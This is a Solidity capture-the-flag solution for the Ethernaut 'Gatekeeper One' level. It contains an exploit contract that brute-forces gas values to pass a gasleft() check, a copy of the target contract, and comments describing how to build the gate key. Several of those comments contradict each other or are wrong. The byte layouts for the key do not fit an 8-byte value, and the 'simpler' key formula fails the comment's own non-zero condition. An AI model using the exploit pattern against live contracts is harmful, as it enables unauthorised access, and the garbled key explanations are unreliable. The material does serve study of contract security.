// Ethernaut Challenge #13: Gatekeeper One
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/*
 * GATEKEEPER ONE CHALLENGE
 * 
 * Goal: Pass through three gates and become the entrant.
 * 
 * GATE ONE: msg.sender != tx.origin
 * - Classic distinction: tx.origin = EOA, msg.sender = contract
 * - Must call from a contract, not directly
 * 
 * GATE TWO: gasleft() % 8191 == 0
 * - Requires precise gas manipulation
 * - Need exactly N * 8191 gas remaining at this check
 * - Trick: Use call{gas: X} with specific X value
 * 
 * GATE THREE: uint32(uint64(_gateKey)) == uint16(uint64(_gateKey))
 *             uint32(uint64(_gateKey)) != uint64(_gateKey)
 *             uint32(uint64(_gateKey)) == uint16(uint160(tx.origin))
 * 
 * Let's decode gate three:
 * - Condition 1: Lower 32 bits == Lower 16 bits
 *   → Bits 16-31 must be 0
 * - Condition 2: Lower 32 bits != Lower 64 bits  
 *   → Bits 32-63 must be non-zero
 * - Condition 3: Lower 16 bits of gateKey == Lower 16 bits of tx.origin
 *   → Last 4 hex chars of gateKey = last 4 of your address
 * 
 * GATEKEY CONSTRUCTION:
 * - Bytes 0-1: Any (will be compared)
 * - Bytes 2-3: Must match tx.origin[2-3]
 * - Bytes 4-7: Must be 0x0000 (condition 1)
 * - Bytes 8-15: Non-zero (condition 2)
 * 
 * Format: 0xXXXXXXXX0000XXXX (where XXXX matches tx.origin)
 * Actually: 0x[8 bytes non-zero][4 bytes zero][2 bytes of origin]
 */

contract GatekeeperOneExploit {
    GatekeeperOne public target;
    
    constructor(address _target) {
        target = GatekeeperOne(_target);
    }
    
    function attack(bytes8 gateKey) external {
        // Gate 1: msg.sender != tx.origin (we're a contract, so true)
        // Gate 2: Need precise gas - brute force or calculate
        // Gate 3: gateKey constructed as described
        
        // Brute force gas amount
        for (uint i = 0; i < 8191; i++) {
            (bool success,) = address(target).call{gas: 8191 * 10 + i}(
                abi.encodeWithSignature("enter(bytes8)", gateKey)
            );
            if (success) break;
        }
    }
}

contract GatekeeperOne {
    address public entrant;
    
    modifier gateOne() {
        require(msg.sender != tx.origin);
        _;
    }
    
    modifier gateTwo() {
        require(gasleft() % 8191 == 0);
        _;
    }
    
    modifier gateThree(bytes8 _gateKey) {
        require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)));
        require(uint32(uint64(_gateKey)) != uint64(_gateKey));
        require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)));
        _;
    }
    
    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
        entrant = tx.origin;
        return true;
    }
}

/*
 * ATTACK STEPS:
 * 
 * 1. Construct gateKey:
 *    - Get last 4 hex chars of your address (last 2 bytes)
 *    - gateKey = bytes8(uint64(uint16(uint160(tx.origin)))) + padding
 *    - Or: bytes8(uint64(1 << 32) | uint64(uint16(uint160(tx.origin))))
 *    - Simpler: bytes8(uint64(uint16(msg.sender))) with high bytes non-zero
 * 
 * 2. Deploy exploit contract with target address
 * 
 * 3. Call attack() with calculated gateKey
 *    - It will brute force gas amount (8191 * 10 + 0 to 8190)
 *    - One of them will pass gateTwo
 * 
 * LESSON:
 * - tx.origin vs msg.sender is fundamental for contract detection
 * - Gas manipulation can be brute forced (but expensive on mainnet)
 * - Type casting in Solidity keeps low-order bits
 * - uint32(x) takes bits 0-31, uint16(x) takes bits 0-15
 */
